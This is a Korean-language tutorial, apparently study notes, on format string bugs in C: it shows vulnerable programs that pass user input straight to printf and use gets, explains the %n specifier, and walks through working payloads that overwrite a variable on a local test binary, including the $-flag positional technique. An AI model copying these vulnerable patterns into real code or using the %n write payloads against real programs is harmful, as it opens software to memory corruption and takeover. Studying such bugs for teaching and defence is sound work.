# Format String Bug

**Format String Bug**는 **printf**나 **sprintf**와 같이 포맷 스트링을 사용하는 함수에서 발생하는 취약점으로, **"%x"** 나 **"%s"** 와 같이 프로그래머가 지정한 문자열이 아닌 사용자의 입력이 포맷 스트링으로 전달될 때 발생하는 취약점입니다.

## Format String Bug가 발생하는 예

[올바른 printf() 함수의 사용]

``` C
#include<stdio.h>
#include<string.h>

int main(int argc, char *argv[])
{
        char buf[20];

        strcpy(buf, argv[1]);
        printf("%s", buf);
}
```

이 프로그램은 정상적으로 printf() 함수에 포맷 스트링 문자열과 그에 대응하는 buf 변수를 인자로 넣어 호출하였다.
```
yoojin@ubuntu:~/Study/System/BOF$ ./correct "%x %x %x %x"
%x %x %x %x
```
실행시켜보면 입력한 문자열을 그대로 출력하는 것을 볼 수 있다.

[잘못된 printf() 함수의 사용]

```C
#include<stdio.h>
#include<string.h>

int main(int argc, char *argv[])
{
        char buf[20];

        strcpy(buf, argv[1]);
        printf(buf);
}
```

이 프로그램은 printf() 함수에 포맷 스트링 문자열을 넣지 않고 buf 변수를 바로 호출하였다.
```
yoojin@ubuntu:~/Study/System/BOF$ ./wrong "%x %x %x %x"
25207825 78252078 782520 f7fb6000y
```
입력한 문자열을 포맷 스트링으로 인식하여 스택의 값들을 출력하는 것을 볼 수 있다.

### %n 서식 지정자

+ %d - int - 부호 없는 10진 정수
+ %u - unsigned int - 부호 없는 10진 정수
+ %o - unsigned int - 부호 없는 8진 정수
+ %x - unsigned int - 부호 없는 16진 정수
+ %f - float - 10진 방식의 부동 소수점 실수
+ %lf - double - 10진 방식의 부동 소수점 실수
+ %c - char - 값에 대응하는 문자
+ %s - char * - 문자열
+ %p - void * - 포인터의 주솟값
+ %n - int * - %n 전까지의 문자 개수 write
+ %hn - short* - %hn 전까지의 문자 개수 write

**%n 서식 지정자 예제**
```C
#include<stdio.h>

int main(void)
{
        int num;

        printf("hello world%n\n", &num);
        printf("num=%d\n", num);
}
```
example 프로그램의 소스 코드를 보면 int형의 num이라는 변수가 있고, printf() 함수로 "hello world"를 출력한다.
그런데 "hello world"뒤에 %n 지정자가 있다. 그리고 num의 주소가 인자로 들어가 있다.
그렇다면 %n 지정자의 전까지의 문자의 개수인 11이 num에 저장될 것이다.
```
yoojin@ubuntu:~/Study/System/BOF$ ./example
hello world
num=11
```

**%n 서식 지정자를 이용한 변수값 변조**
```C
#include<stdio.h>

int main(void)
{
        int num = 1234;
        char buf[20];

        printf("num = %d\n", num);
        printf("num = %p\n", &num);

        gets(buf);
        printf(buf);
        puts(" ");

        printf("num = %d\n", num);
}
```
modulation 프로그램의 소스 코드를 보면 num이라는 변수에 1234가 저장되어 있고, 포맷 스트링을 입력받을 buf가 선언되어 있다.
포맷 스트링을 입력하여 변수의 값을 변조하기 전에 변수에 저장되어 있는 값을 출력하고, 변조하기 위해 필요한 num의 주소를 출력해준다.
그리고 gets()함수로 buf에 문자열을 입력받아 printf()함수로 출력한다.
그 후, 변수가 잘 변조되었는지 확인하기 위해 num의 값을 출력한다.
```
yoojin@ubuntu:~/Study/System/BOF$ ./modulation
num = 1234
num = 0xffffd074
AAAA %x %x %x %x
AAAA 41414141 20782520 25207825 78252078 
num = 1234
```
포맷 스트링으로 인한 스택의 값이 어떻게 출력되는지 확인하기 위해 "AAAA"와 %x 서식 지정자를 4개 입력해보았다.
첫 번째 %x에 입력한 "AAAA"가 온다. 그러면 원하는 값으로 num을 조작하지 못한다.
```
yoojin@ubuntu:~/Study/System/BOF$ ./modulation
num = 1234
num = 0xffffd074
AAAABBBB %x %x
AAAABBBB 41414141 42424242 
num = 1234
```
"AAAA"뒤에 4Byte를 더 입력해 원하는 길이의 문자열을 출력할 수 있게 구성한다.
num의 값을 변조하기 위해 페이로드를 짜 보면 다음과 같다.
BBBB의 위치에 num의 주소를 넣고 첫 번째 %x에 문자열 길이를 지정하고 두 번째 %x를 %n으로 바꾸어 준다. 
num을 5678로 변조하면 페이로드가 아래와 같다.
**Dummy(4) + num의 주소(4) + %5670x(5678) + %n**

%5678x가 아닌 %5670x를 한 이유는 앞에서 Dummy 4Byte와 num의 주소 4Byte로 인해 이미 8Byte가 출력됐기 때문이다.
```
yoojin@ubuntu:~/Study/System/BOF$ (python -c 'print("AAAA\x74\xd0\xff\xff%5670x%n")' ; cat) | ./modulation
```
```
                                                                   41414141 
num = 5678
```
num의 값이 5678로 변조되었다.

## $-flag 기법
앞의 예제에서 원하는 값으로 변수를 변조하기 위해 변조할 변수의 주소값 앞에 Dummy를 넣었다.
앞의 예제는 간단한 예제라 별로 큰 어려움이 없었겠지만, 만약 엄청나게 복잡한 공격일 경우 복잡한 계산을 필요로 한다.
하지만 $-flag 기법을 이용하면 그런 복잡한 계산을 할 필요가 없어진다.
$-flag는 포맷 스트링에서 인자의 위치를 지정하는데 쓰인다.

**$-flag 예제**
```C
#include<stdio.h>

int main(void)
{
        int a=10;
        float b=20.22;
        double c=30.33;
        char d='A';

        printf("a=%2$d, b=%4$.2f, c=%1$.2lf, d=%3$c\n", c, a, d, b);
}
```
flag 프로그램의 소스 코드에서 printf() 함수를 보면, 변수들의 인자가 섞여 있다.
변수 a를 출력하려고 하는데 첫 번째 서식 지정자 %d는 $-flag를 사요앙하여 두 번재 인자 a를 가리키고 있고, 두 번째 서식 지정자 %f는 네 번째 인자 b, 세 번째 서식 지정자 %lf는 첫 번째 인자 c, 네 번째 서식 지정자 %c는 세 번째 인자 d를 가리키고 있다. 그리하여 저렇게 변수 인자들의 순서가 뒤섞여 있어도 우리가 원하는 모양으로 출력이 된다.
```
yoojin@ubuntu:~/Study/System/BOF$ ./flag
a=10, b=20.22, c=30.33, d=A
```
앞의 예제인 modulation 프로그램을 $-flag를 이용하여 변수의 값을 변조해 보겠다.
```
yoojin@ubuntu:~/Study/System/BOF$ (python -c 'print("\x74\xd0\xff\xff%5674x%1$n")'; cat) | ./modulation
```
```
                                                                      ffffd074 
num = 5678
```
$-flag를 이용하면 Dummy 값을 넣을 필요도 없고 계산도 더욱 간단해진다.

[출처]https://d4m0n.tistory.com/28?category=796362
